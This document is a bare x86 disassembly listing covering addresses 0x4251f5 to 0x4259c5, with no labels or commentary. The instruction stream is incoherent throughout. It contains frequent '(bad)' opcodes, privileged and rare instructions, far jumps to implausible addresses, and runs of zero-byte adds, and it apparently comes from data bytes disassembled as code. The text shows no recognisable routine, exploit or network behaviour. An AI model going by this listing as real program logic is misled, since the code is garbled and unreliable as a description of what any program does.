  4251f5:	mov    esi,0x17bb32ae
  4251fa:	jnp    0x425260
  4251fc:	xor    BYTE PTR [esi-0x7ad3dd50],bl
  425202:	jmp    0xf20f55ef
  425207:	fwait
  425208:	add    esi,DWORD PTR [ebp-0x66]
  42520b:	sbb    eax,0x66b07ed8
  425210:	and    DWORD PTR [ecx+0x6d417001],eax
  425216:	sub    DWORD PTR [esi+0x41],ebx
  425219:	ins    DWORD PTR es:[edi],dx
  42521a:	sub    DWORD PTR [eax],ebp
  42521c:	les    ebp,FWORD PTR [ebp+0x28]
  42521f:	jo     0x4251a1
  425221:	out    0xaf,eax
  425223:	fidivr DWORD PTR [edx-0x771eba06]
  425229:	call   0x3efd1c64
  42522e:	fistp  QWORD PTR [edx-0x3c9a4fc2]
  425235:	test   al,0xf5
  425237:	push   DWORD PTR [ebp+0x2915be85]
  42523d:	jns    0x42522c
  42523f:	aas    
  425240:	into   
  425241:	jbe    0x425245
  425243:	jne    0x42520d
  425245:	iret   
  425246:	inc    ebp
  425247:	clc    
  425248:	push   0x1430aa4d
  42524d:	jns    0x425251
  42524f:	jb     0x42523f
  425251:	add    BYTE PTR [eax],al
  425253:	add    BYTE PTR [eax],al
  425255:	add    BYTE PTR [edi],dh
  425257:	inc    esi
  425258:	clc    
  425259:	(bad)  
  42525b:	scas   eax,DWORD PTR es:[edi]
  42525c:	sti    
  42525d:	jbe    0x425294
  42525f:	mov    dh,0xb8
  425261:	leave  
  425262:	sub    al,0x2
  425264:	add    bh,cl
  425266:	fld    DWORD PTR [esi-0xc]
  425269:	fisttp DWORD PTR [ecx-0x20]
  42526c:	mov    edi,0x470b9b2
  425271:	jmp    0x3f2953bc
  425276:	and    eax,0x4798ec87
  42527b:	xchg   ecx,eax
  42527d:	inc    ecx
  42527e:	pusha  
  42527f:	lods   eax,DWORD PTR ds:[esi]
  425280:	sti    
  425281:	cs icebp 
  425283:	inc    ebp
  425284:	cld    
  425285:	jb     0x4252bc
  425287:	cli    
  425288:	repnz inc ecx
  42528a:	jae    0x42524e
  42528c:	lea    edi,[edx+eax*8-0x404641f1]
  425293:	xor    eax,0x6410608
  425298:	sti    
  425299:	aam    0xb6
  42529b:	adc    al,0x40
  42529d:	jmp    0xeec1fc9d
  4252a2:	sbb    al,0x36
  4252a4:	pop    ds
  4252a5:	push   ebx
  4252a6:	jno    0x4252d0
  4252a8:	add    BYTE PTR [esi],dh
  4252aa:	or     al,0x15
  4252ac:	add    al,0xff
  4252ae:	mov    dh,0x2
  4252b0:	push   edx
  4252b1:	inc    ebx
  4252b2:	gs call 0x8500:0x65f00ac
  4252ba:	add    BYTE PTR [eax],al
  4252bc:	add    BYTE PTR [eax],al
  4252be:	add    ah,bl
  4252c0:	icebp  
  4252c1:	xorps  xmm2,XMMWORD PTR [edi-0x1944178a]
  4252c8:	push   0x5cfc8bf7
  4252cd:	(bad)  
  4252ce:	xor    bl,ah
  4252d0:	pop    esp
  4252d1:	aas    
  4252d2:	xor    ebp,edx
  4252d4:	push   esp
  4252d5:	test   esi,esi
  4252d7:	push   0x53236216
  4252dc:	pop    esi
  4252dd:	mov    bh,0xfb
  4252df:	jae    0x42534a
  4252e1:	test   al,al
  4252e3:	call   0xf808d5f3
  4252e8:	fwait
  4252e9:	or     BYTE PTR gs:[edi+0x3356f9dc],dh
  4252f0:	call   DWORD PTR [edi]
  4252f2:	push   ss
  4252f3:	sbb    al,0x3
  4252f5:	dec    edi
  4252f6:	dec    ecx
  4252f8:	sahf   
  4252f9:	adc    DWORD PTR [eax-0x34],eax
  4252fc:	pop    ebp
  4252fd:	adc    bh,bh
  4252ff:	leave  
  425300:	(bad)  
  425301:	adc    eax,0xd87d9c40
  425306:	mov    ebx,DWORD PTR [edx+0x628b00dc]
  42530c:	imul   edx,DWORD PTR [eax],0x2fff7353
  425312:	push   ss
  425313:	fadd   QWORD PTR [edx]
  425315:	sub    eax,eax
  425317:	(bad)  
  425318:	dec    eax
  425319:	push   edi
  42531a:	leave  
  42531b:	dec    esi
  42531c:	add    al,BYTE PTR [eax]
  42531e:	push   0x5c
  425320:	imul   esi,DWORD PTR [esp+0x0],0x0
  425325:	add    BYTE PTR [eax],al
  425327:	add    BYTE PTR [eax+0x6b],dl
  42532a:	je     0x425350
  42532c:	inc    eax
  42532d:	imul   esi,DWORD PTR [ecx+0x4],0x53
  425331:	std    
  425332:	pop    ds
  425333:	push   ss
  425334:	pushf  
  425335:	push   es
  425336:	mov    edx,0x4a9b7508
  42533b:	xchg   DWORD PTR [ecx+0x19],edx
  42533e:	mov    ds:0x510da62c,eax
  425343:	xchg   DWORD PTR ds:0x4f87ae31,ebp
  425349:	ror    DWORD PTR [edi-0x79],0x7b
  42534d:	adc    al,0x55
  42534f:	xchg   DWORD PTR [ebx],ebp
  425351:	gs dec edi
  425353:	add    al,0xf8
  425355:	pop    ebx
  425356:	cmp    DWORD PTR [edx],eax
  425358:	jbe    0x4253cd
  42535a:	in     al,dx
  42535b:	test   DWORD PTR [esi],0xfa482bbf
  425361:	into   
  425362:	ret    
  425363:	adc    eax,0x2ef29b35
  425368:	xchg   edx,eax
  425369:	fwait
  42536a:	push   DWORD PTR [ebx+edi*1+0x3]
  42536e:	hlt    
  42536f:	je     0x4253e6
  425371:	fwait
  425372:	add    BYTE PTR [ebp-0x57],0x6b
  425376:	mov    WORD PTR [ebp+0x7d],es
  425379:	rcr    esi,0xe7
  42537c:	nop
  42537d:	call   0x2b29:0xdbf0ffff
  425384:	stos   DWORD PTR es:[edi],eax
  425385:	retfw  
  425387:	and    BYTE PTR [ecx],ah
  425389:	sahf   
  42538a:	test   BYTE PTR [eax+eax*1+0x0],0x0
  42538f:	add    BYTE PTR [eax],al
  425391:	xchg   ecx,eax
  425392:	jbe    0x42537b
  425394:	icebp  
  425395:	xor    bh,ch
  425397:	std    
  425398:	jae    0x425415
  42539a:	sbb    BYTE PTR [edx],dh
  42539c:	fdiv   DWORD PTR [ebp-0x72]
  42539f:	fiadd  WORD PTR [edx+eax*4+0x74b0637c]
  4253a6:	fs pop ecx
  4253a8:	push   edi
  4253a9:	cmp    al,0xd9
  4253ab:	cli    
  4253ac:	call   edx
  4253ae:	cs loopne 0x4253b0
  4253b1:	bound  ebx,QWORD PTR [ebp+ecx*1+0x29028330]
  4253b8:	add    al,0xa3
  4253ba:	ret    0xaace
  4253bd:	dec    esi
  4253be:	aaa    
  4253bf:	lds    ebp,FWORD PTR [ebx-0x23ab52bc]
  4253c5:	push   edx
  4253c6:	sahf   
  4253c7:	sbb    al,0x8b
  4253c9:	and    DWORD PTR [ebx+0x6e],edx
  4253cc:	lds    ebx,FWORD PTR ds:0x1eb7b4f6
  4253d2:	jnp    0x4253f8
  4253d4:	mov    eax,0xaef146f2
  4253d9:	sub    eax,0xa089a909
  4253de:	scas   al,BYTE PTR es:[edi]
  4253df:	mov    cl,0xa5
  4253e2:	lods   eax,DWORD PTR ds:[esi]
  4253e3:	adc    al,0xc
  4253e5:	xchg   ebx,eax
  4253e6:	add    al,BYTE PTR [edx-0xb527acf]
  4253ec:	pop    es
  4253ed:	out    dx,al
  4253ee:	xor    ch,ch
  4253f0:	mov    dh,0x88
  4253f2:	call   0x0:0x43d4
  4253f9:	add    BYTE PTR [ebp-0x45],dh
  4253fc:	daa    
  4253fd:	or     BYTE PTR [ebp+0x18],dh
  425400:	jmp    0xe52895bb
  425405:	mov    dh,0x49
  425407:	out    0xdc,al
  425409:	mov    dh,0x44
  42540b:	push   es
  42540c:	inc    edx
  42540d:	adc    DWORD PTR [ebp+0x14],ebp
  425410:	test   eax,0xe8f9eb03
  425415:	push   eax
  425416:	cli    
  425417:	popf   
  425418:	data16 test al,0x49
  42541b:	push   ecx
  42541c:	mov    ebx,0x6ea9fa4e
  425421:	mov    ch,0xf2
  425423:	(bad)  
  425424:	inc    BYTE PTR [edi-0x6]
  425427:	adc    edx,DWORD PTR [ecx+0x4]
  42542a:	ins    DWORD PTR es:[edi],dx
  42542b:	add    ch,cl
  42542d:	cli    
  42542e:	push   0xfffffffc
  425430:	stos   BYTE PTR es:[edi],al
  425431:	mov    esi,0x62004fc5
  425436:	cmp    ebp,DWORD PTR [eax-0x3d0a22b2]
  42543c:	jp     0x42542d
  42543e:	ja     0x42540a
  425440:	daa    
  425441:	loope  0x425462
  425443:	fdiv   DWORD PTR [ebx+0x13]
  425446:	or     dl,BYTE PTR [esi]
  425448:	int3   
  425449:	hlt    
  42544a:	mov    dh,0x2
  42544c:	cmp    eax,0xfbac53fa
  425451:	xor    al,0x1c
  425453:	test   eax,0x45ede175
  425458:	aam    0x19
  42545a:	out    dx,al
  42545b:	inc    ebp
  42545c:	or     al,0x13
  42545e:	add    BYTE PTR [eax],al
  425460:	add    BYTE PTR [eax],al
  425462:	add    BYTE PTR [edi-0x66],dh
  425465:	push   ebp
  425466:	jmp    0xa9c756e1
  42546b:	inc    ebp
  42546c:	or     dh,dl
  42546e:	and    al,0x25
  425470:	lods   eax,DWORD PTR ds:[esi]
  425471:	outs   dx,DWORD PTR ds:[esi]
  425472:	in     al,dx
  425473:	icebp  
  425474:	inc    esi
  425475:	fdivr  st(4),st
  425477:	add    DWORD PTR [ebp+0x7266f6fb],0x53430e01
  425481:	leave  
  425482:	sub    edi,DWORD PTR [esi+0x2]
  425485:	sub    DWORD PTR cs:[edi],ebx
  425488:	mov    dh,0xfb
  42548a:	fsubr  QWORD PTR [edx+0x6b1915a7]
  425490:	inc    edx
  425491:	add    BYTE PTR [edx-0x17],dl
  425494:	add    ecx,0x51
  425497:	pop    eax
  425498:	mov    bl,0xfb
  42549a:	ss inc esi
  42549c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42549d:	je     0x4254a4
  42549f:	imul   esp,DWORD PTR [eax+eax*1],0x17e66226
  4254a6:	push   ds
  4254a7:	pop    edx
  4254a8:	out    0x17,al
  4254aa:	push   ss
  4254ab:	dec    ecx
  4254ac:	push   es
  4254ad:	sti    
  4254ae:	hlt    
  4254af:	(bad)  
  4254b0:	adc    eax,0xb05c0040
  4254b5:	enter  0x7483,0x74
  4254b9:	pop    es
  4254ba:	xchg   ebp,eax
  4254bb:	mov    ecx,es
  4254bd:	or     al,0x0
  4254bf:	add    DWORD PTR [eax-0x14],edi
  4254c2:	sub    DWORD PTR [eax],0xfffffffa
  4254c5:	jp     0x42552c
  4254c7:	add    BYTE PTR [eax],al
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [eax],ch
  4254cd:	push   es
  4254ce:	dec    ebx
  4254cf:	push   edi
  4254d0:	sub    ebx,ebx
  4254d2:	pop    es
  4254d3:	mov    ebp,DWORD PTR [ecx+0x2]
  4254d6:	push   cs
  4254d7:	inc    eax
  4254d8:	sbb    al,0x76
  4254da:	outs   dx,BYTE PTR ds:[esi]
  4254db:	or     BYTE PTR [edi+0x1076f7ce],ah
  4254e1:	jbe    0x4254b2
  4254e3:	test   esp,ecx
  4254e5:	icebp  
  4254e6:	pop    es
  4254e7:	add    edi,0x74
  4254ea:	jmp    0x417178
  4254ef:	mov    bl,BYTE PTR [edx-0x2]
  4254f2:	scas   eax,DWORD PTR es:[edi]
  4254f3:	add    DWORD PTR [ebp+0x1785f443],edx
  4254f9:	repnz add al,0x89
  4254fc:	mov    DWORD PTR [esi-0xa],ebp
  4254ff:	rcr    bl,0x1c
  425502:	ror    BYTE PTR [ecx+0x75f6fe91],0xcc
  425509:	add    DWORD PTR [ebp-0xc],0xffffffa6
  42550d:	dec    BYTE PTR [edi-0x1]
  425510:	mov    eax,ds:0x2815f6f6
  425515:	push   ss
  425516:	inc    eax
  425517:	add    BYTE PTR [edi],ah
  425519:	into   
  42551a:	test   ebx,ebx
  42551c:	loope  0x425530
  42551e:	div    DWORD PTR [ebp-0x68]
  425521:	jns    0x4254e1
  425523:	call   0x39be3b
  425528:	and    dh,al
  42552a:	je     0x425535
  42552c:	pop    es
  42552d:	jmp    0x42553a
  42552f:	cmp    DWORD PTR [eax],eax
  425531:	add    BYTE PTR [eax],al
  425533:	add    BYTE PTR [eax],al
  425535:	jne    0x4254e8
  425537:	sub    ecx,edi
  425539:	mov    ?,WORD PTR [esi+0x1572c780]
  42553f:	adc    edi,DWORD PTR [edi+0x6e]
  425542:	fwait
  425543:	sub    cl,BYTE PTR [ecx]
  425545:	cmp    dl,BYTE PTR [edi-0x4d]
  425548:	fbstp  TBYTE PTR [esi-0x65]
  42554b:	jmp    esi
  42554d:	sbb    BYTE PTR [edx],0xb8
  425550:	(bad)  
  425551:	jne    0x4254ee
  425553:	push   DWORD PTR [edx+edi*2+0x58]
  425557:	cmp    bh,ah
  425559:	test   eax,0x32000400
  42555e:	jmp    0x72b4:0xb3a3fb13
  425565:	jns    0x4255d7
  425567:	int3   
  425568:	test   DWORD PTR ds:0x3e7f00f0,esi
  42556e:	popa   
  42556f:	cmp    BYTE PTR [ebp+0x9],0x9c
  425573:	sub    ecx,DWORD PTR [ecx]
  425575:	add    al,BYTE PTR [edi]
  425577:	mov    eax,0xdcb60fb
  42557c:	inc    eax
  42557d:	jne    0x42555f
  42557f:	mov    BYTE PTR [edi+0xcc1724e],bh
  425585:	jne    0x42558d
  425587:	mov    esp,ebp
  425589:	mul    BYTE PTR [edi]
  42558b:	add    ebp,DWORD PTR [edi]
  42558d:	mov    ch,0x6b
  42558f:	dec    edi
  425590:	lea    edi,[eax]
  425592:	mov    bl,0x4e
  425594:	push   eax
  425595:	and    eax,0x8d03c5
  42559a:	add    BYTE PTR [eax],al
  42559c:	add    BYTE PTR [eax],al
  42559e:	xor    BYTE PTR [edi+0x4f],cl
  4255a1:	push   0x97ff9b79
  4255a6:	stos   BYTE PTR es:[edi],al
  4255a7:	outs   dx,BYTE PTR ds:[esi]
  4255a8:	pop    es
  4255a9:	ret    
  4255aa:	cmp    bh,ah
  4255ac:	std    
  4255ad:	push   DWORD PTR [ebp-0x65]
  4255b0:	mov    esp,0xf9028d45
  4255b5:	fmul   QWORD PTR [edx-0x7ec1dd57]
  4255bb:	jp     0x4255b3
  4255bd:	add    esi,DWORD PTR [ebp-0x57]
  4255c0:	hlt    
  4255c1:	mov    bh,0x88
  4255c3:	inc    edx
  4255c4:	jmp    0x294fa375
  4255c9:	inc    ebx
  4255ca:	sub    al,0xc4
  4255cc:	in     eax,dx
  4255cd:	add    eax,eax
  4255cf:	jge    0x4255ce
  4255d1:	push   ecx
  4255d2:	(bad)  
  4255d4:	adc    eax,0xdd36f8c4
  4255d9:	push   ebp
  4255da:	mov    ch,0x52
  4255dc:	aas    
  4255dd:	or     bh,BYTE PTR [esi]
  4255df:	das    
  4255e0:	loope  0x42565e
  4255e2:	mov    eax,0x7d19c2a6
  4255e7:	adc    BYTE PTR [ecx],ch
  4255e9:	add    al,0x26
  4255eb:	retf   0xc3ce
  4255ee:	mov    ch,0xbb
  4255f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255f1:	or     BYTE PTR [ebp+0x55],dh
  4255f4:	cmp    al,0xf7
  4255f6:	and    edx,DWORD PTR [eax+0x26]
  4255f9:	test   BYTE PTR [eax-0x36],al
  4255fc:	mov    ah,0x47
  4255fe:	jne    0x425602
  425600:	xor    bh,BYTE PTR [ecx]
  425602:	add    BYTE PTR [eax],al
  425604:	add    BYTE PTR [eax],al
  425606:	add    BYTE PTR [eax-0x552e0e98],ch
  42560c:	add    dl,BYTE PTR [ebx]
  42560e:	mov    bl,0x88
  425610:	or     dl,bh
  425612:	inc    ebx
  425613:	jne    0x425597
  425615:	lods   al,BYTE PTR ds:[esi]
  425616:	retf   
  425617:	mov    al,0x44
  425619:	jmp    0x514d9621
  42561e:	sahf   
  42561f:	(bad)  
  425620:	test   al,0x52
  425622:	mov    BYTE PTR [ebp+0x78caf92d],dh
  425628:	(bad)  
  425629:	and    al,0x47
  42562b:	jne    0x425646
  42562d:	add    al,BYTE PTR [esi+0x75]
  425630:	jp     0x425632
  425632:	aam    0xae
  425634:	(bad)  
  425635:	aas    
  425636:	jmp    0x5580367
  42563b:	arpl   WORD PTR [edx+0x0],ax
  42563e:	jae    0x42566d
  425640:	ficom  WORD PTR [ebx]
  425642:	add    DWORD PTR ds:0xf20efbab,eax
  425648:	in     eax,dx
  425649:	daa    
  42564a:	fbstp  TBYTE PTR [esi-0x1c1899fe]
  425650:	stos   BYTE PTR es:[edi],al
  425651:	dec    edi
  425652:	sahf   
  425653:	daa    
  425654:	aad    0x66
  425656:	fdiv   DWORD PTR [eax-0x58]
  425659:	push   edx
  42565a:	jb     0x42564a
  42565c:	stos   DWORD PTR es:[edi],eax
  42565d:	shl    BYTE PTR [edx+0xe],cl
  425660:	sub    ch,bh
  425662:	(bad)  
  425663:	cmp    ch,0x7e
  425666:	into   
  425667:	out    0x2d,eax
  425669:	(bad)  
  42566a:	cli    
  42566b:	add    BYTE PTR [eax],al
  42566d:	add    BYTE PTR [eax],al
  42566f:	add    BYTE PTR [ebx],bh
  425671:	xor    BYTE PTR ds:0x427cf5,0x1c
  425678:	out    0xd4,al
  42567a:	push   ebx
  42567b:	scas   al,BYTE PTR es:[edi]
  42567c:	sub    al,0x4c
  42567e:	pop    edx
  42567f:	inc    esp
  425680:	mov    esp,DWORD PTR [edi+0x57]
  425683:	stos   DWORD PTR es:[edi],eax
  425684:	jp     0x425688
  425686:	push   ebp
  425687:	(bad)  
  425688:	fisub  DWORD PTR [edi]
  42568a:	in     al,dx
  42568b:	cmc    
  42568c:	dec    ebx
  42568d:	xlat   BYTE PTR ds:[ebx]
  42568e:	(bad)  
  42568f:	pop    ds
  425690:	fld    DWORD PTR [esi]
  425692:	fcomp  DWORD PTR [ebx+edi*1+0x64bc7502]
  425699:	cli    
  42569a:	fldcw  WORD PTR [edx]
  42569c:	jns    0x4256f2
  42569e:	sti    
  42569f:	cld    
  4256a0:	jle    0x42569a
  4256a2:	aas    
  4256a3:	jmp    0x351a5d76
  4256a8:	xor    eax,DWORD PTR [edx]
  4256aa:	jne    0x42569f
  4256ac:	push   cs
  4256ad:	and    dh,dl
  4256af:	add    BYTE PTR [ebx],dh
  4256b1:	je     0x425637
  4256b3:	shr    al,0xe
  4256b6:	mov    edi,0x3bd28005
  4256bb:	add    bl,dl
  4256bd:	pushf  
  4256be:	cmp    eax,0xd7fa5a00
  4256c3:	(bad)  
  4256c5:	add    eax,DWORD PTR [ecx]
  4256c7:	push   esi
  4256c8:	arpl   WORD PTR [edx],cx
  4256ca:	sbb    al,0x12
  4256cc:	sbb    al,0x3
  4256ce:	add    BYTE PTR [ebp+0x64],0x50
  4256d2:	bound  eax,QWORD PTR [edx]
  4256d4:	add    BYTE PTR [eax],al
  4256d6:	add    BYTE PTR [eax],al
  4256d8:	add    BYTE PTR [ebx+esi*4+0x5463fff8],al
  4256df:	not    DWORD PTR ds:0x400934
  4256e5:	lds    edi,FWORD PTR [edi]
  4256e7:	clc    
  4256e8:	adc    DWORD PTR [ecx+esi*2+0x75],0x4
  4256ed:	pop    edi
  4256ee:	mov    esi,0xaf9778e3
  4256f3:	not    DWORD PTR ds:0x534efe5c
  4256f9:	jg     0x425722
  4256fb:	dec    ebp
  4256fc:	cld    
  4256fd:	jge    0x42574c
  4256ff:	lea    ecx,[ebp-0x30]
  425702:	push   edx
  425703:	dec    ebx
  425704:	push   ebx
  425705:	xchg   ebx,eax
  425706:	or     al,0x0
  425708:	add    BYTE PTR [ecx+ecx*2+0x50],al
  42570c:	mov    DWORD PTR [ecx-0x5a],eax
  42570f:	mov    BYTE PTR [ebp+0x0],bl
  425712:	jno    0x4256e2
  425714:	xor    esp,0x70
  425717:	jne    0x42575c
  425719:	arpl   WORD PTR [edi],cx
  42571b:	int3   
  42571c:	adc    eax,0x1e3cfe8c
  425721:	mov    ebx,0x6a750002
  425726:	and    eax,0xbd97fc45
  42572b:	je     0x425759
  42572d:	jne    0x425770
  42572f:	push   ecx
  425730:	dec    ebx
  425731:	jne    0x4256cc
  425733:	jbe    0x42577a
  425735:	jge    0x42573b
  425737:	lds    esi,FWORD PTR [esi+edx*2-0x74]
  42573b:	push   esp
  42573c:	lea    eax,[eax]
  42573e:	add    BYTE PTR [eax],al
  425740:	add    BYTE PTR [eax],al
  425742:	xor    ch,ch
  425744:	push   ebx
  425745:	sti    
  425746:	or     ch,dl
  425748:	mov    al,0x75
  42574a:	jge    0x4257b8
  42574c:	push   esp
  42574d:	push   ebx
  42574e:	or     BYTE PTR [ebp+0x15a3fba7],0xc4
  425755:	je     0x4257d5
  425757:	hlt    
  425758:	xor    cl,BYTE PTR [eax]
  42575a:	pop    ebp
  42575b:	xchg   ecx,eax
  42575c:	inc    eax
  42575d:	add    BYTE PTR [ebp+0x32],dh
  425760:	dec    ebx
  425761:	or     BYTE PTR [edx+0x27],bl
  425764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425765:	sti    
  425766:	push   0x7540196f
  42576b:	xor    BYTE PTR [edx+0x8],al
  42576e:	mov    ds:0x37c94ce5,al
  425773:	cwde   
  425774:	call   DWORD PTR [esi+edi*8+0x67]
  425778:	test   ah,ch
  42577a:	jns    0x425784
  42577c:	push   esi
  42577d:	push   ebx
  42577e:	addr16 pop ebx
  425780:	xchg   edi,eax
  425781:	mov    ebx,DWORD PTR ds:0x987fb06d
  425787:	jae    0x425788
  425789:	xchg   BYTE PTR ds:0x75f44255,ch
  42578f:	mov    bl,0xff
  425791:	push   DWORD PTR [ebx]
  425793:	xlat   BYTE PTR ds:[ebx]
  425794:	mov    al,0x0
  425796:	repnz push cs
  425798:	mov    eax,0x9783608d
  42579d:	lods   al,BYTE PTR ds:[esi]
  42579e:	xor    ebx,DWORD PTR [ebx+0x335886ff]
  4257a4:	add    eax,0x0
  4257a7:	add    BYTE PTR [eax],al
  4257a9:	add    BYTE PTR [eax],al
  4257ab:	dec    ecx
  4257ac:	mov    ecx,0x2c1457a
  4257b1:	mov    ecx,0xcf025b58
  4257b6:	loope  0x4257e3
  4257b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257b9:	cld    
  4257ba:	lahf   
  4257bb:	test   DWORD PTR [edx-0x17],eax
  4257be:	jl     0x425765
  4257c0:	add    DWORD PTR [ebx+0x20],0x463af428
  4257c7:	sahf   
  4257c8:	xor    BYTE PTR [eax+esi*4-0x63e4cc6e],0x76
  4257d0:	sbb    cl,dh
  4257d2:	push   ecx
  4257d3:	clc    
  4257d4:	lods   al,BYTE PTR ds:[esi]
  4257d5:	xchg   ebp,eax
  4257d6:	sti    
  4257d7:	daa    
  4257d8:	call   0xb0d6:0x2754116
  4257df:	(bad)  
  4257e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257e1:	fdivr  st(7),st
  4257e3:	jo     0x425827
  4257e5:	jmp    0x93878e66
  4257ea:	dec    esp
  4257eb:	cmp    al,0xc1
  4257ed:	xchg   esp,eax
  4257ee:	jl     0x425849
  4257f0:	push   ebx
  4257f1:	imul   esi,ecx,0x426c72a
  4257f7:	jne    0x425828
  4257f9:	adc    DWORD PTR [esi-0x11],edx
  4257fc:	stc    
  4257fd:	stos   BYTE PTR es:[edi],al
  4257fe:	inc    ebx
  4257ff:	jne    0x42584d
  425801:	ret    0x7d19
  425804:	adc    BYTE PTR [ecx],ch
  425806:	add    al,0xf5
  425808:	out    0x90,al
  42580a:	rcl    DWORD PTR [edx+0x2],1
  42580d:	jmp    0x42584a
  425812:	add    BYTE PTR [eax],al
  425814:	arpl   WORD PTR [edx-0x5b01470e],bx
  42581a:	les    eax,FWORD PTR gs:[ecx-0x2ef655ed]
  425821:	(bad)  
  425822:	es add al,0x5e
  425825:	frstor [esi]
  425827:	add    al,0xb7
  425829:	(bad)  
  42582a:	mov    al,ds:0x29ad1
  42582f:	call   0xcd58015c
  425834:	fs inc edx
  425836:	add    bh,al
  425838:	cmc    
  425839:	ds cld 
  42583b:	mov    ecx,0x620c2f0b
  425840:	cmp    al,0xfa
  425842:	gs jmp 0xfa3e96fb
  425848:	jbe    0x42584c
  42584a:	add    BYTE PTR [ecx-0x62],dl
  42584d:	lods   al,BYTE PTR ds:[esi]
  42584e:	sti    
  42584f:	sub    DWORD PTR ss:[ecx+0xedbe175],ebp
  425856:	adc    al,0xff
  425858:	add    al,BYTE PTR ss:[ebp+0x67f43d29]
  42585f:	dec    ebp
  425860:	out    dx,eax
  425861:	inc    edx
  425862:	add    BYTE PTR [esi],cl
  425864:	lods   al,BYTE PTR ds:[esi]
  425865:	idiv   dl
  425867:	fcomp  QWORD PTR [esi+0x13]
  42586a:	inc    eax
  42586b:	jmp    0xec29bcd4
  425870:	mov    BYTE PTR [ecx],0xc9
  425873:	sub    ecx,DWORD PTR [ecx-0x5c]
  425876:	push   esp
  425877:	jb     0x425879
  425879:	add    BYTE PTR [eax],al
  42587b:	add    BYTE PTR [eax],al
  42587d:	loop   0x4258a2
  42587f:	in     al,dx
  425880:	cmp    DWORD PTR [ecx+0x2],ebx
  425883:	or     cl,ch
  425885:	jbe    0x425821
  425887:	xor    BYTE PTR [edi],bl
  425889:	jno    0x42588d
  42588b:	mov    DWORD PTR [ecx+ebp*8],ebp
  42588e:	jge    0x425850
  425890:	xor    al,0x1a
  425892:	push   ds
  425893:	or     BYTE PTR [esi+0x2911f26d],dh
  425899:	jno    0x42586f
  42589b:	mov    edi,0x1f690
  4258a0:	jmp    0x40022c4c
  4258a5:	dec    edx
  4258a6:	jne    0x425925
  4258a8:	nop
  4258a9:	mov    al,0x3d
  4258ab:	clc    
  4258ac:	add    ah,cl
  4258ae:	dec    ecx
  4258af:	add    DWORD PTR [ebp-0x1c],0x28
  4258b3:	inc    eax
  4258b4:	or     BYTE PTR [ebp+0x3a],dl
  4258b7:	fmul   QWORD PTR [ebx+0x40830291]
  4258bd:	les    esp,FWORD PTR [esi]
  4258bf:	inc    ebp
  4258c0:	loopne 0x425909
  4258c2:	cmp    dl,BYTE PTR [edi+eax*8]
  4258c5:	loope  0x42584e
  4258c7:	cli    
  4258c8:	call   FWORD PTR [edi+edi*8-0x561f3f7c]
  4258cf:	mov    BYTE PTR [ebp+0x30],al
  4258d2:	mov    esp,0xff9fe845
  4258d7:	(bad)  
  4258d8:	call   FWORD PTR [edi]
  4258da:	(bad)  
  4258dc:	add    BYTE PTR [edx+0x3a],dl
  4258df:	test   DWORD PTR [eax],0x0
  4258e5:	add    BYTE PTR [ebp-0x4b],ah
  4258e8:	add    BYTE PTR [eax],al
  4258ea:	pop    esp
  4258eb:	jp     0x4258ad
  4258ed:	je     0x42594f
  4258ef:	cmp    al,0x1
  4258f2:	imul   edi,DWORD PTR [edx-0x11],0x0
  4258f6:	dec    esp
  4258f7:	inc    DWORD PTR [edx+0x5d285875]
  4258fd:	or     BYTE PTR [ecx+0x45ebf8f2],ch
  425903:	sub    dh,BYTE PTR [ebp+0x8]
  425906:	(bad)  
  425907:	xor    ecx,DWORD PTR [ecx*4+0x458d56c9]
  42590e:	or     al,0x4e
  425910:	div    DWORD PTR [esi+0x24]
  425913:	push   esi
  425914:	outs   dx,BYTE PTR ds:[esi]
  425915:	add    al,0xdb
  425917:	or     al,BYTE PTR [eax]
  425919:	push   ss
  42591a:	pop    esp
  42591b:	inc    BYTE PTR [eax+eax*8+0xde7c2b]
  425922:	or     al,0xff
  425924:	in     eax,dx
  425925:	inc    ebp
  425926:	pushf  
  425927:	push   DWORD PTR [ebx+0x70]
  42592a:	jne    0x42594c
  42592c:	inc    ebx
  42592d:	mov    ah,0xf0
  42592f:	pop    eax
  425930:	cmp    BYTE PTR [esp+ebp*8-0x2b],al
  425934:	mov    bh,0xe9
  425936:	les    ebx,FWORD PTR [eax-0x22010001]
  42593c:	or     eax,DWORD PTR [ebp-0x78f55344]
  425942:	je     0x425972
  425944:	push   ebx
  425945:	in     al,dx
  425946:	daa    
  425947:	inc    esp
  425948:	xor    esi,eax
  42594a:	add    BYTE PTR [eax],al
  42594c:	add    BYTE PTR [eax],al
  42594e:	add    BYTE PTR [esi+0x63],al
  425951:	lods   al,BYTE PTR ds:[esi]
  425952:	push   eax
  425953:	jno    0x425972
  425955:	les    ecx,FWORD PTR [ebx]
  425957:	stc    
  425958:	and    al,0x4
  42595a:	add    BYTE PTR [ebp+0x30],dh
  42595d:	inc    ebx
  42595e:	in     al,dx
  42595f:	clc    
  425960:	fsubr  DWORD PTR [ecx]
  425962:	sbb    BYTE PTR [edx+0x2887136d],cl
  425968:	or     DWORD PTR [ebp-0x46cf9a8b],ebp
  42596e:	call   0xfbef4fd6
  425973:	icebp  
  425974:	jmp    0x425972
  425976:	or     DWORD PTR [eax],0xffffffac
  425979:	(bad)  
  42597a:	(bad)  
  42597b:	out    dx,al
  42597c:	test   eax,0xab7d0017
  425981:	(bad)  
  425982:	cli    
  425983:	rcr    BYTE PTR [ebx-0x23bd3588],0x7
  42598a:	mov    DWORD PTR [eax-0x4d3f7d31],esi
  425990:	mov    DWORD PTR [esi],esp
  425992:	or     eax,0x15bb972a
  425997:	mov    ch,0xab
  425999:	jmp    0x8574:0xffab522e
  4259a0:	popa   
  4259a1:	inc    edx
  4259a2:	mov    al,0x55
  4259a4:	xlat   BYTE PTR ds:[ebx]
  4259a5:	or     al,BYTE PTR [edi-0x794efd48]
  4259ab:	xor    eax,0x77eb6f18
  4259b0:	pop    ss
  4259b1:	loop   0x4259cc
  4259b3:	add    BYTE PTR [eax],al
  4259b5:	add    BYTE PTR [eax],al
  4259b7:	add    BYTE PTR [ecx+eiz*4+0x16],dh
  4259bb:	or     dh,bl
  4259bd:	mul    eax
  4259bf:	adc    eax,0xc3640235
  4259c4:	dec    eax
  4259c5:	xor    ch,BYTE PTR [ebx-0x137d8bfc]
